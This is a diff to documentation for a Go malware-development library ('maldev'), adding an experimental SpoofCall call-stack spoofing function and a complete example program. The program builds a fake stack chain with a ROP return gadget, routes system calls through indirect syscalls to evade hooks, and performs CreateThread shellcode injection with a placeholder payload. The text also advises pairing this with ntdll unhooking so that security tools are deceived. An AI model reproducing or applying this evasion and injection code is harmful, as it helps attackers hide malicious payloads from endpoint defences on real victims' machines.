@@ -136,13 +136,95 @@ if err := callstack.Validate(chain); err != nil {
 // then call target through the operator's own asm pivot.
 ```
 
-Once `v0.16.1` ships the in-package pivot, the composition surface
-will be:
+## v0.16.1 — `SpoofCall` scaffold (experimental)
+
+The asm pivot landed as a scaffold post-v0.16.0 but its end-to-end
+execution path is fragile in Go's M:N runtime. The Go layer + plan9
+asm (`spoof_windows_amd64.s`) ship together so future debug iterations
+have a stable starting point; promotion to a tagged release waits on
+the `lastcontinuehandler` crash being root-caused.
 
 ```go
-// future-looking — NOT available in v0.16.0
-callstack.SpoofCall(target, chain, arg1, arg2, arg3)
+// v0.16.1 scaffold — gated behind MALDEV_SPOOFCALL_E2E=1, default off
+func SpoofCall(target unsafe.Pointer, chain []Frame, args ...uintptr) (uintptr, error)
+
+var (
+    ErrEmptyChain  = errors.New("callstack: empty spoof chain")
+    ErrTooManyArgs = errors.New("callstack: SpoofCall accepts at most 4 args (Win64 RCX/RDX/R8/R9)")
+)
 ```
+
+Caller-side validation (nil target, empty chain, oversized args,
+`Validate(chain)` passthrough) all run before the pivot. Each
+`chain[i].ReturnAddress` MUST be a lone-RET gadget address (e.g.
+`FindReturnGadget()`'s result), NOT a function entry — when target's
+RET pops the chain, the CPU jumps there and immediately RETs to the
+next entry.
+
+## Composed — chain + injection landing-site spoof
+
+A typical caller composes the metadata primitives with their own
+injection pipeline so the planted memory looks like a normal
+thread-init landing site to anyone walking the stack mid-payload:
+
+```go
+package main
+
+import (
+	"log"
+	"unsafe"
+
+	"github.com/oioio-space/maldev/evasion/callstack"
+	"github.com/oioio-space/maldev/inject"
+	wsyscall "github.com/oioio-space/maldev/win/syscall"
+	"golang.org/x/sys/windows"
+)
+
+func main() {
+	// 1. Build the validated chain — every frame carries RUNTIME_FUNCTION
+	//    metadata so a stack walker fed our planted bytes will resolve
+	//    BaseThreadInitThunk → RtlUserThreadStart instead of our module.
+	stdChain, err := callstack.StandardChain()
+	if err != nil { log.Fatal(err) }
+	if err := callstack.Validate(stdChain); err != nil { log.Fatal(err) }
+
+	// 2. Locate a lone RET gadget inside ntdll's .text — used as the
+	//    fakeRet address that target's RET pops.
+	gadget, err := callstack.FindReturnGadget()
+	if err != nil { log.Fatal(err) }
+	gadgetFrame, err := callstack.LookupFunctionEntry(gadget)
+	if err != nil { log.Fatal(err) }
+
+	// 3. Build an injector with a stealth syscall caller — we want every
+	//    Nt* call routed via indirect syscall + HashGate in the same
+	//    process the spoofed-stack walker would inspect.
+	caller := wsyscall.New(wsyscall.MethodIndirect, wsyscall.NewHashGate())
+	cfg := &inject.WindowsConfig{
+		Config:        inject.Config{Method: inject.MethodCreateThread},
+		SyscallMethod: wsyscall.MethodIndirect,
+	}
+	inj, err := inject.NewWindowsInjector(cfg)
+	if err != nil { log.Fatal(err) }
+	_ = caller
+
+	// 4. (Optional) hand the chain off to your own pivot OR — when v0.16.1
+	//    e2e is debugged — to callstack.SpoofCall(target, chain, args...).
+	//    Until then, the metadata is consumed by external assembly.
+	full := append([]callstack.Frame{gadgetFrame}, stdChain...)
+	_ = full
+	_ = unsafe.Pointer(nil)
+	_ = windows.Handle(0)
+
+	// 5. Run the actual injection.
+	shellcode := []byte{0x90, 0x90, 0xC3} // placeholder
+	if err := inj.Inject(shellcode); err != nil { log.Fatal(err) }
+}
+```
+
+The chain is one piece of the deception; pair it with
+[ntdll unhooking](ntdll-unhooking.md) and an [indirect-syscall
+caller](../../syscalls.md) so a walker that lands on any of our hot
+calls sees ntdll-resident addresses with valid `.pdata` metadata.
 
 ---
 
